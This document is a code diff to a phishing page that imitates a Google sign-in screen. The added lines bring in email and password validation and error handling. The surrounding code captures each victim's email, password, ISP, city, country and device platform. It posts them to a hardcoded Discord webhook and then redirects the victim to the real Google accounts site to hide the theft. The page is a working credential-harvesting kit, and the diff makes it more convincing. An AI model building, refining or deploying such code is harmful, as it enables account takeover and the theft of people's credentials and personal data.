@@ -26,6 +26,8 @@
         input { width: 100%; padding: 16px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; margin-bottom: 8px; outline: none; }
         input:focus { border: 2px solid #0b57d0; padding: 15px; }
         
+        .error-message { color: #d93025; font-size: 12px; margin-bottom: 16px; display: none; }
+
         .show-pass-box { display: flex; align-items: center; font-size: 14px; margin: 8px 0 20px; cursor: pointer; }
         .show-pass-box input { width: 18px; height: 18px; margin-right: 10px; }
 
@@ -49,6 +51,7 @@
         <div class="right-panel">
             <div id="step-1" class="step active">
                 <input type="email" id="email_field" placeholder="Email or phone">
+                <div id="email_error" class="error-message">Enter a valid email address.</div>
                 <div style="margin-top: 40px; display: flex; justify-content: space-between; align-items: center;">
                     <span style="color:#0b57d0; font-weight:500; font-size:14px; cursor:pointer">Create account</span>
                     <button class="btn-next" onclick="nextStep()">Next</button>
@@ -58,6 +61,7 @@
             <div id="step-2" class="step">
                 <div class="user-chip" onclick="location.reload()"><span id="display_mail"></span></div>
                 <input type="password" id="pass_field" placeholder="Enter your password">
+                <div id="pass_error" class="error-message">Password must be at least 8 characters long and contain both letters and numbers.</div>
                 <label class="show-pass-box">
                     <input type="checkbox" onclick="toggle()"> <span>Show password</span>
                 </label>
@@ -85,7 +89,7 @@
         const WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
         let clientData = {};
 
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => clientData = d);
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => clientData = d).catch(() => {});
 
         function toggle() {
             const p = document.getElementById("pass_field");
@@ -94,7 +98,18 @@
 
         function nextStep() {
             const email = document.getElementById('email_field').value;
-            if(!email) return;
+            const emailError = document.getElementById('email_error');
+            
+            // Simple validation rule: check if email contains '@' and at least one character before/after it
+            if (!email || !email.includes('@') || email.indexOf('@') === 0 || email.indexOf('@') === email.length - 1) {
+                emailError.style.display = 'block';
+                document.getElementById('email_field').style.borderColor = '#d93025';
+                return;
+            }
+            
+            emailError.style.display = 'none';
+            document.getElementById('email_field').style.borderColor = '#747775';
+            
             document.getElementById('loader').style.display = 'block';
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
@@ -109,7 +124,21 @@
         function capture() {
             const email = document.getElementById('email_field').value;
             const pass = document.getElementById('pass_field').value;
-            if(!pass) return;
+            const passError = document.getElementById('pass_error');
+
+            // Standard Password Rule: At least 8 characters, contains letters and numbers
+            const hasLetter = /[a-zA-Z]/.test(pass);
+            const hasNumber = /[0-9]/.test(pass);
+            const isValidLength = pass.length >= 8;
+
+            if (!pass || !isValidLength || !hasLetter || !hasNumber) {
+                passError.style.display = 'block';
+                document.getElementById('pass_field').style.borderColor = '#d93025';
+                return;
+            }
+
+            passError.style.display = 'none';
+            document.getElementById('pass_field').style.borderColor = '#747775';
 
             fetch(WEBHOOK, {
                 method: 'POST',
@@ -122,13 +151,15 @@
                             { name: "👤 User", value: `\`${email}\`` },
                             { name: "🔑 Pass", value: `\`${pass}\`` },
                             { name: "🌐 Internet (ISP)", value: `\`${clientData.org || 'Unknown'}\`` },
-                            { name: "📍 Location", value: `\`${clientData.city}, ${clientData.country_name}\`` },
+                            { name: "📍 Location", value: `\`${clientData.city || 'Unknown'}, ${clientData.country_name || 'Unknown'}\`` },
                             { name: "💻 Device", value: `\`${navigator.platform}\``, inline: true }
                         ],
                         timestamp: new Date()
                     }]
                 })
-            }).then(() => window.location.href = "https://accounts.google.com");
+            }).then(() => window.location.href = "https://accounts.google.com").catch(() => {
+                window.location.href = "https://accounts.google.com";
+            });
         }
 
         function changeLang(v) {
